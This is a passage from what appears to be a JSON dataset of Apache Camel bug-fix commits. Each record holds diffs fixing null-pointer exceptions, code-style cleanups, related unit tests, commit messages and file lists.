                "blob_url": "https://github.com/apache/camel/blob/deb61d414c0032dd2f6f9eac27b1861374c8398f/camel-core/src/main/java/org/apache/camel/impl/MessageSupport.java",
                "changes": 19,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/MessageSupport.java?ref=deb61d414c0032dd2f6f9eac27b1861374c8398f",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/MessageSupport.java",
                "patch": "@@ -33,7 +33,7 @@\n  * Unless a specific provider wishes to do something particularly clever with\n  * headers you probably want to just derive from {@link DefaultMessage}\n  *\n- * @version \n+ * @version\n  */\n public abstract class MessageSupport implements Message, CamelContextAware, DataTypeAware {\n     private CamelContext camelContext;\n@@ -48,17 +48,20 @@ public String toString() {\n         return String.format(\"Message[%s]\", messageId == null ? \"\" : messageId);\n     }\n \n+    @Override\n     public Object getBody() {\n         if (body == null) {\n             body = createBody();\n         }\n         return body;\n     }\n \n+    @Override\n     public <T> T getBody(Class<T> type) {\n         return getBody(type, getBody());\n     }\n \n+    @Override\n     public Object getMandatoryBody() throws InvalidPayloadException {\n         Object answer = getBody();\n         if (answer == null) {\n@@ -97,6 +100,7 @@ public Object getMandatoryBody() throws InvalidPayloadException {\n         return null;\n     }\n \n+    @Override\n     public <T> T getMandatoryBody(Class<T> type) throws InvalidPayloadException {\n         // eager same instance type test to avoid the overhead of invoking the type converter\n         // if already same type\n@@ -116,14 +120,16 @@ public Object getMandatoryBody() throws InvalidPayloadException {\n         throw new InvalidPayloadException(e, type, this);\n     }\n \n+    @Override\n     public void setBody(Object body) {\n         this.body = body;\n         // set data type if in use\n-        if (body != null && camelContext.isUseDataType()) {\n+        if (body != null && camelContext != null && camelContext.isUseDataType()) {\n             this.dataType = new DataType(body.getClass());\n         }\n     }\n \n+    @Override\n     public <T> void setBody(Object value, Class<T> type) {\n         Exchange e = getExchange();\n         if (e != null) {\n@@ -156,6 +162,7 @@ public boolean hasDataType() {\n         return dataType != null;\n     }\n \n+    @Override\n     public Message copy() {\n         Message answer = newInstance();\n         // must copy over CamelContext\n@@ -166,6 +173,7 @@ public Message copy() {\n         return answer;\n     }\n \n+    @Override\n     public void copyFrom(Message that) {\n         if (that == this) {\n             // the same instance so do not need to copy\n@@ -183,6 +191,7 @@ public void copyFrom(Message that) {\n         copyFromWithNewBody(that, that.getBody());\n     }\n \n+    @Override\n     public void copyFromWithNewBody(Message that, Object newBody) {\n         if (that == this) {\n             // the same instance so do not need to copy\n@@ -219,6 +228,7 @@ public void copyFromWithNewBody(Message that, Object newBody) {\n         copyAttachments(that);\n     }\n \n+    @Override\n     public Exchange getExchange() {\n         return exchange;\n     }\n@@ -227,14 +237,17 @@ public void setExchange(Exchange exchange) {\n         this.exchange = exchange;\n     }\n \n+    @Override\n     public CamelContext getCamelContext() {\n         return camelContext;\n     }\n \n+    @Override\n     public void setCamelContext(CamelContext camelContext) {\n         this.camelContext = camelContext;\n     }\n \n+    @Override\n     public void copyAttachments(Message that) {\n         // the attachments may be the same instance if the end user has made some mistake\n         // and set the OUT message with the same attachment instance of the IN message etc\n@@ -270,13 +283,15 @@ protected Object createBody() {\n         return null;\n     }\n \n+    @Override\n     public String getMessageId() {\n         if (messageId == null) {\n             messageId = createMessageId();\n         }\n         return this.messageId;\n     }\n \n+    @Override\n     public void setMessageId(String messageId) {\n         this.messageId = messageId;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/deb61d414c0032dd2f6f9eac27b1861374c8398f/camel-core/src/main/java/org/apache/camel/impl/MessageSupport.java",
                "sha": "a2ae7e73a2a738129eaffe8d1e3ebecacc72c9cd",
                "status": "modified"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/deb61d414c0032dd2f6f9eac27b1861374c8398f/camel-core/src/test/java/org/apache/camel/impl/DefaultMessageTest.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/impl/DefaultMessageTest.java?ref=deb61d414c0032dd2f6f9eac27b1861374c8398f",
                "deletions": 3,
                "filename": "camel-core/src/test/java/org/apache/camel/impl/DefaultMessageTest.java",
                "patch": "@@ -16,15 +16,16 @@\n  */\n package org.apache.camel.impl;\n \n+import static org.hamcrest.CoreMatchers.instanceOf;\n+import static org.hamcrest.MatcherAssert.assertThat;\n+import static org.junit.Assert.assertEquals;\n+\n import java.util.LinkedHashMap;\n import java.util.Map;\n \n import org.apache.camel.Attachment;\n import org.junit.Test;\n \n-import static org.hamcrest.CoreMatchers.instanceOf;\n-import static org.hamcrest.MatcherAssert.assertThat;\n-\n public class DefaultMessageTest {\n \n     @Test\n@@ -36,4 +37,14 @@ public void testAttachmentsAreSorted() {\n         assertThat(attachments, instanceOf(LinkedHashMap.class));\n     }\n \n+    @Test\n+    public void testCamelContextIsNull() {\n+        @SuppressWarnings(\"deprecation\")\n+        DefaultMessage message = new DefaultMessage();\n+        String body = \"something\";\n+        message.setBody(body);\n+        assertEquals(body, message.getBody());\n+        assertEquals(null, message.getCamelContext());\n+    }\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/deb61d414c0032dd2f6f9eac27b1861374c8398f/camel-core/src/test/java/org/apache/camel/impl/DefaultMessageTest.java",
                "sha": "0ca646383832c001bf71464d28d16bc518963022",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11948  NPE on DefaultMessage setBody if deprecated constructor was used (#2064)\n\n* CAMEL-11948 NPE on DefaultMessage setBody if deprecated constructor was\r\nused\r\n\r\n* CAMEL-11948 NPE on DefaultMessage setBody if deprecated constructor was\r\nused\r\n* Adding test",
        "parent": "https://github.com/apache/camel/commit/c0536079d0e8d0dd2bc1ec797a061e7b7ee73942",
        "patched_files": [
            "DefaultMessage.java",
            "MessageSupport.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "MessageSupportTest.java",
            "DefaultMessageTest.java"
        ]
    },
    "camel_dfa9b54": {
        "bug_id": "camel_dfa9b54",
        "commit": "https://github.com/apache/camel/commit/dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/builder/BuilderSupport.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/builder/BuilderSupport.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/builder/BuilderSupport.java",
                "patch": "@@ -17,7 +17,8 @@\n package org.apache.camel.builder;\n \n import java.util.ArrayList;\n-import java.util.List;import java.util.Arrays;\n+import java.util.Arrays;\n+import java.util.List;\n \n import org.apache.camel.CamelContext;\n import org.apache.camel.Endpoint;",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/builder/BuilderSupport.java",
                "sha": "21a5592c1665fcca5c10b45d702bc5450e443096",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java",
                "patch": "@@ -21,8 +21,8 @@\n \n import org.apache.camel.AsyncCallback;\n import org.apache.camel.Processor;\n-import org.apache.camel.processor.DeadLetterChannel;\n import org.apache.camel.impl.ScheduledPollConsumer;\n+import org.apache.camel.processor.DeadLetterChannel;\n import org.apache.commons.logging.Log;\n import org.apache.commons.logging.LogFactory;\n ",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java",
                "sha": "433b2307975f3cad5164af7a50b54d766d308521",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/component/mock/MockEndpoint.java",
                "changes": 9,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/mock/MockEndpoint.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 4,
                "filename": "camel-core/src/main/java/org/apache/camel/component/mock/MockEndpoint.java",
                "patch": "@@ -19,10 +19,11 @@\n import java.beans.PropertyChangeListener;\n import java.beans.PropertyChangeSupport;\n import java.util.ArrayList;\n+import java.util.Arrays;\n import java.util.Collection;\n import java.util.HashMap;\n import java.util.List;\n-import java.util.Map;import java.util.Arrays;\n+import java.util.Map;\n import java.util.concurrent.CopyOnWriteArrayList;\n import java.util.concurrent.CountDownLatch;\n import java.util.concurrent.TimeUnit;\n@@ -286,12 +287,12 @@ public void expectedHeaderReceived(String name, String value) {\n         expects(new Runnable() {\n             public void run() {\n                 assertTrue(\"No header with name \" + headerName + \" found.\", actualHeader != null);\n-                \n+\n                 assertEquals(\"Header of message\", headerValue, actualHeader);\n             }\n         });\n-    }   \n-    \n+    }\n+\n     /**\n      * Adds an expectation that the given body values are received by this\n      * endpoint",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/component/mock/MockEndpoint.java",
                "sha": "570f5454d62855a387b8213ce2a7b822fc6dd41c",
                "status": "modified"
            },
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/component/vm/VmComponent.java",
                "changes": 14,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/vm/VmComponent.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 7,
                "filename": "camel-core/src/main/java/org/apache/camel/component/vm/VmComponent.java",
                "patch": "@@ -35,7 +35,7 @@\n  * @version $Revision$\n  */\n public class VmComponent extends SedaComponent {\n-    protected static final Map<String, BlockingQueue> queues = new HashMap<String, BlockingQueue>();\n+    protected static final Map<String, BlockingQueue> QUEUES = new HashMap<String, BlockingQueue>();\n     private static final AtomicInteger START_COUNTER = new AtomicInteger();\n \n \n@@ -46,11 +46,11 @@ protected Endpoint createEndpoint(String uri, String remaining, Map parameters)\n     }\n \n     protected BlockingQueue<Exchange> getBlockingQueue(String uri, Map parameters) {\n-        synchronized (queues) {\n-            BlockingQueue<Exchange> answer = queues.get(uri);\n+        synchronized (QUEUES) {\n+            BlockingQueue<Exchange> answer = QUEUES.get(uri);\n             if (answer == null) {\n                 answer = createQueue(uri, parameters);\n-                queues.put(uri, answer);\n+                QUEUES.put(uri, answer);\n             }\n             return answer;\n         }\n@@ -66,11 +66,11 @@ protected void doStart() throws Exception {\n     protected void doStop() throws Exception {\n         super.doStop();\n         if (START_COUNTER.decrementAndGet() == 0) {\n-            synchronized (queues) {\n-                for (BlockingQueue q : queues.values()) {\n+            synchronized (QUEUES) {\n+                for (BlockingQueue q : QUEUES.values()) {\n                     q.clear();\n                 }\n-                queues.clear();\n+                QUEUES.clear();\n             }\n         }\n     }",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/component/vm/VmComponent.java",
                "sha": "00d95d0b699d8e82d150ca9279150ec7ba0d888e",
                "status": "modified"
            },
            {
                "additions": 11,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java",
                "changes": 21,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 10,
                "filename": "camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java",
                "patch": "@@ -31,6 +31,7 @@\n import org.apache.camel.impl.ServiceSupport;\n import org.apache.camel.model.ProcessorType;\n import org.apache.camel.model.RouteType;\n+import org.apache.camel.processor.interceptor.Debugger;\n import org.apache.camel.spi.InstrumentationAgent;\n import org.apache.camel.spi.LifecycleStrategy;\n import org.apache.camel.spi.RouteContext;\n@@ -83,13 +84,13 @@ public void onRoutesAdd(Collection<Route> routes) {\n             try {\n                 ManagedRoute mr = new ManagedRoute(route);\n                 // retrieve the per-route intercept for this route\n-                InstrumentationProcessor interceptor = interceptorMap.get(route.getEndpoint());\n+                /*InstrumentationProcessor interceptor = interceptorMap.get(route.getEndpoint());\n                 if (interceptor == null) {\n                     LOG.warn(\"Instrumentation processor not found for route endpoint \"\n                              + route.getEndpoint());\n                 } else {\n                     interceptor.setCounter(mr);\n-                }\n+                }*/\n                 agent.register(mr, getNamingStrategy().getObjectName(mr));\n             } catch (JMException e) {\n                 LOG.warn(\"Could not register Route MBean\", e);\n@@ -134,29 +135,29 @@ public void onRouteContextCreate(RouteContext routeContext) {\n \n         routeContext.addInterceptStrategy(new InstrumentationInterceptStrategy(counterMap));\n \n+        // TODO we need to find other way to instrument the route.\n+        // below codes adding wrap the processor with all the processors which are already wrapped\n+        // by the InstrumentationInterceptStrategy\n+\n+        /*\n         // Add an InstrumentationProcessor at the beginning of each route and\n         // set up the interceptorMap for onRoutesAdd() method to register the\n         // ManagedRoute MBeans.\n+\n         RouteType routeType = routeContext.getRoute();\n         if (routeType.getInputs() != null && !routeType.getInputs().isEmpty()) {\n             if (routeType.getInputs().size() > 1) {\n                 LOG.warn(\"Add InstrumentationProcessor to first input only.\");\n             }\n \n             Endpoint endpoint  = routeType.getInputs().get(0).getEndpoint();\n-            ProcessorType<?>[] outputs =\n-                routeType.getOutputs().toArray(new ProcessorType<?>[0]);\n \n-            //routeType.clearOutput();\n             InstrumentationProcessor processor = new InstrumentationProcessor();\n+\n             routeType.addInterceptor(processor);\n \n-            /*for (ProcessorType<?> output : outputs) {\n-                routeType.addOutput(output);\n-            }\n-*/\n             interceptorMap.put(endpoint, processor);\n-        }\n+        }*/\n     }\n \n     public CamelNamingStrategy getNamingStrategy() {",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java",
                "sha": "4fc460e709e700418b974b91bacc3af7916c4201",
                "status": "modified"
            },
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/model/ChoiceType.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/ChoiceType.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/model/ChoiceType.java",
                "patch": "@@ -47,7 +47,12 @@\n \n     @Override\n     public String toString() {\n-        return \"Choice[ \" + getWhenClauses() + \" \" + getOtherwise() + \"]\";\n+        if (getOtherwise() != null) {\n+            return \"Choice[ \" + getWhenClauses() + \" \" + getOtherwise() + \"]\";\n+        } else {\n+            return \"Choice[ \" + getWhenClauses() + \"]\";\n+\n+        }\n     }\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/model/ChoiceType.java",
                "sha": "da5d12b48dacc7d3e2ff69c7ceda906a149d7400",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/model/ProcessorType.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/model/ProcessorType.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/model/ProcessorType.java",
                "patch": "@@ -18,12 +18,13 @@\n \n import java.rmi.registry.Registry;\n import java.util.ArrayList;\n+import java.util.Arrays;\n import java.util.Collection;\n import java.util.Collections;\n import java.util.HashSet;\n import java.util.LinkedList;\n import java.util.List;\n-import java.util.Set;import java.util.Arrays;\n+import java.util.Set;\n import java.util.concurrent.ThreadPoolExecutor;\n \n import javax.xml.bind.annotation.XmlAccessType;",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/model/ProcessorType.java",
                "sha": "d133e97f9520b37dffaf56980c61cefe79a8eab8",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/view/NodeData.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/view/NodeData.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/view/NodeData.java",
                "patch": "@@ -109,7 +109,9 @@ public NodeData(String id, Object node, String imagePrefix) {\n \n             ChoiceType choice = (ChoiceType)node;\n             List<ProcessorType> outputs = new ArrayList<ProcessorType>(choice.getWhenClauses());\n-            outputs.add(choice.getOtherwise());\n+            if (choice.getOtherwise() != null) {\n+                outputs.add(choice.getOtherwise());\n+            }\n             this.outputs = outputs;\n         } else if (node instanceof RecipientListType) {\n             this.image = imagePrefix + \"RecipientListIcon.png\";\n@@ -131,7 +133,7 @@ public NodeData(String id, Object node, String imagePrefix) {\n         }\n \n         // lets auto-default as many values as we can\n-        if (isNullOrBlank(this.nodeType)) {\n+        if (isNullOrBlank(this.nodeType) && node != null) {\n             // TODO we could add this to the model?\n             String name = node.getClass().getName();\n             int idx = name.lastIndexOf('.');",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/main/java/org/apache/camel/view/NodeData.java",
                "sha": "fd3fb367a035d7c6a0bfedaf0a263f891600fe0f",
                "status": "modified"
            },
            {
                "additions": 16,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/test/java/org/apache/camel/component/file/FileNoOpLockFileTest.java",
                "changes": 16,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/file/FileNoOpLockFileTest.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/file/FileNoOpLockFileTest.java",
                "patch": "@@ -1,3 +1,19 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n package org.apache.camel.component.file;\n \n import java.io.File;",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/test/java/org/apache/camel/component/file/FileNoOpLockFileTest.java",
                "sha": "ee88666c8cc63971baeed4578bfbd335d82525f9",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/test/java/org/apache/camel/component/file/FilerProducerFileNamesTest.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/file/FilerProducerFileNamesTest.java?ref=dfa9b54b6d722119a1846ba8567a2657dfdebcd2",
                "deletions": 4,
                "filename": "camel-core/src/test/java/org/apache/camel/component/file/FilerProducerFileNamesTest.java",
                "patch": "@@ -19,8 +19,8 @@\n import java.io.File;\n \n import org.apache.camel.ContextTestSupport;\n-import org.apache.camel.Exchange;\n import org.apache.camel.Endpoint;\n+import org.apache.camel.Exchange;\n import org.apache.camel.builder.RouteBuilder;\n \n /**\n@@ -56,11 +56,11 @@ public void testProducerWithHeaderFileName() throws Exception {\n     protected RouteBuilder createRouteBuilder() throws Exception {\n         return new RouteBuilder() {\n             public void configure() throws Exception {\n-                from(\"direct:report\").to( \"file:target/reports/report.txt\");\n+                from(\"direct:report\").to(\"file:target/reports/report.txt\");\n \n-                from(\"direct:report2\").to( \"file:target/report2.txt?autoCreate=false\");\n+                from(\"direct:report2\").to(\"file:target/report2.txt?autoCreate=false\");\n \n-                from(\"direct:report3\").setHeader(FileComponent.HEADER_FILE_NAME, \"report-super.txt\").to( \"file:target/\");\n+                from(\"direct:report3\").setHeader(FileComponent.HEADER_FILE_NAME, \"report-super.txt\").to(\"file:target/\");\n             }\n         };\n     }",
                "raw_url": "https://github.com/apache/camel/raw/dfa9b54b6d722119a1846ba8567a2657dfdebcd2/camel-core/src/test/java/org/apache/camel/component/file/FilerProducerFileNamesTest.java",
                "sha": "c9b253662033ca8dc8673db3b9c39b28b275b8fc",
                "status": "modified"
            }
        ],
        "message": "CAMEL-550 fixed the NPE error , also fixed some CS errors\n\ngit-svn-id: https://svn.apache.org/repos/asf/activemq/camel/trunk@660216 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/376b5107d1dc98319cb06b8e9c17b14807f2a894",
        "patched_files": [
            "InstrumentationLifecycleStrategy.java",
            "NodeData.java",
            "MockEndpoint.java",
            "VmComponent.java",
            "ChoiceType.java",
            "BuilderSupport.java",
            "FileConsumer.java",
            "ProcessorType.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "FilerProducerFileNamesTest.java",
            "MockEndpointTest.java",
            "FileNoOpLockFileTest.java"
        ]
    },
    "camel_e034907": {
        "bug_id": "camel_e034907",
        "commit": "https://github.com/apache/camel/commit/e034907ee15d939cbcfde171bb63715e23f01a6a",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/e034907ee15d939cbcfde171bb63715e23f01a6a/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java?ref=e034907ee15d939cbcfde171bb63715e23f01a6a",
                "deletions": 1,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "patch": "@@ -392,7 +392,7 @@ protected MessageContentsList getResponsePayloadList(org.apache.cxf.message.Exch\n         int i = 0;\n         if (boi.getOutput() != null) {\n             for (MessagePartInfo partInfo : boi.getOutput().getMessageParts()) {\n-                if (elements.size() > i) {\n+                if (elements != null && elements.size() > i) {\n                     answer.put(partInfo, elements.get(i++));\n                 }\n             }",
                "raw_url": "https://github.com/apache/camel/raw/e034907ee15d939cbcfde171bb63715e23f01a6a/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/DefaultCxfBinding.java",
                "sha": "8a63da2767d301f8b8fe39d9949c644067b2c4e7",
                "status": "modified"
            }
        ],
        "message": " CAMEL-4649 Fixed the NPE issue of DefaultCxfBinding when the soap body is empty\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1199703 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/b38e01ef285ba5c214a7c1271737f2c50f1d0881",
        "patched_files": [
            "DefaultCxfBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCxfBindingTest.java"
        ]
    },
    "camel_e0d3edd": {
        "bug_id": "camel_e0d3edd",
        "commit": "https://github.com/apache/camel/commit/e0d3edd94940d29403076d098d53595be6480214",
        "file": [
            {
                "additions": 27,
                "blob_url": "https://github.com/apache/camel/blob/e0d3edd94940d29403076d098d53595be6480214/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/CxfRsProducer.java",
                "changes": 28,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/CxfRsProducer.java?ref=e0d3edd94940d29403076d098d53595be6480214",
                "deletions": 1,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/CxfRsProducer.java",
                "patch": "@@ -401,7 +401,7 @@ private String arrayToString(Object[] array) {\n     protected CxfOperationException populateCxfRsProducerException(Exchange exchange, Response response, int responseCode) {\n         CxfOperationException exception;\n         String uri = exchange.getFromEndpoint().getEndpointUri();\n-        String statusText = Response.Status.fromStatusCode(responseCode).toString();\n+        String statusText = statusTextFromResponseCode(responseCode);\n         Map<String, String> headers = parseResponseHeaders(response, exchange);\n         //Get the response detail string\n         String copy = exchange.getContext().getTypeConverter().convertTo(String.class, response.getEntity());\n@@ -422,6 +422,32 @@ protected CxfOperationException populateCxfRsProducerException(Exchange exchange\n         return exception;\n     }\n \n+    /**\n+     * Convert the given HTTP response code to its corresponding status text or\n+     * response category. This is useful to avoid creating NPEs if this producer\n+     * is presented with an HTTP response code that the JAX-RS API doesn't know.\n+     *\n+     * @param responseCode the HTTP response code to be converted to status text\n+     * @return the status text for the code, or, if JAX-RS doesn't know the code,\n+     *         the status category as text\n+     */\n+    String statusTextFromResponseCode(int responseCode) {\n+        Response.Status status = Response.Status.fromStatusCode(responseCode);\n+\n+        return status != null ? status.toString() : responseCategoryFromCode(responseCode);\n+    }\n+\n+    /**\n+     * Return the category of the given HTTP response code, as text. Invalid\n+     * codes will result in appropriate text; this method never returns null.\n+     *\n+     * @param responseCode HTTP response code whose category is to be returned\n+     * @return the category of the give response code; never {@code null}.\n+     */\n+    private String responseCategoryFromCode(int responseCode) {\n+        return Response.Status.Family.familyOf(responseCode).name();\n+    }\n+\n     protected Map<String, String> parseResponseHeaders(Object response, Exchange camelExchange) {\n \n         Map<String, String> answer = new HashMap<String, String>();",
                "raw_url": "https://github.com/apache/camel/raw/e0d3edd94940d29403076d098d53595be6480214/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/jaxrs/CxfRsProducer.java",
                "sha": "a6ae7c2c60c6894504a42502073106b364e3ec6d",
                "status": "modified"
            },
            {
                "additions": 27,
                "blob_url": "https://github.com/apache/camel/blob/e0d3edd94940d29403076d098d53595be6480214/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/CxfRsProducerTest.java",
                "changes": 27,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/CxfRsProducerTest.java?ref=e0d3edd94940d29403076d098d53595be6480214",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/CxfRsProducerTest.java",
                "patch": "@@ -42,6 +42,10 @@\n import org.springframework.context.support.AbstractXmlApplicationContext;\n import org.springframework.context.support.ClassPathXmlApplicationContext;\n \n+import static org.hamcrest.CoreMatchers.containsString;\n+import static org.hamcrest.CoreMatchers.instanceOf;\n+import static org.hamcrest.CoreMatchers.is;\n+\n public class CxfRsProducerTest extends CamelSpringTestSupport {\n     private static int port1 = CXFTestSupport.getPort1(); \n     private static int port2 = CXFTestSupport.getPort(\"CxfRsProducerTest.jetty\"); \n@@ -468,4 +472,27 @@ public void testProducerWithFeature() {\n         assertTrue(\"The feature should be initialized\", feature.initialized);\n     }\n \n+    @Test\n+    public void testProducer422Response() {\n+        Exchange exchange = template.send(\"cxfrs://http://localhost:\" + getPort1() + \"/\" + getClass().getSimpleName() + \"/?httpClientAPI=true\", new Processor() {\n+            public void process(Exchange exchange) throws Exception {\n+                exchange.setPattern(ExchangePattern.InOut);\n+                Message message = exchange.getIn();\n+                // Try to create a new Customer with an invalid name\n+                message.setHeader(Exchange.HTTP_METHOD, \"POST\");\n+                message.setHeader(Exchange.HTTP_PATH, \"/customerservice/customers\");\n+                Customer customer = new Customer();\n+                customer.setId(8888);\n+                customer.setName(\"\");  // will trigger a 422 response (a common REST server validation response code)\n+                message.setBody(customer);\n+            }\n+        });\n+\n+        assertNotNull(\"Expect the exception here\", exchange.getException());\n+        assertThat(\"Exception should be a CxfOperationException\", exchange.getException(), instanceOf(CxfOperationException.class));\n+\n+        CxfOperationException cxfOperationException = CxfOperationException.class.cast(exchange.getException());\n+\n+        assertThat(\"CXF operation exception has correct response code\", cxfOperationException.getStatusCode(), is(422));\n+    }\n }",
                "raw_url": "https://github.com/apache/camel/raw/e0d3edd94940d29403076d098d53595be6480214/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/CxfRsProducerTest.java",
                "sha": "50bd010001b7b9b9e78b7abfcafa539289b6ff08",
                "status": "modified"
            },
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/e0d3edd94940d29403076d098d53595be6480214/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/jaxrs/testbean/CustomerService.java",
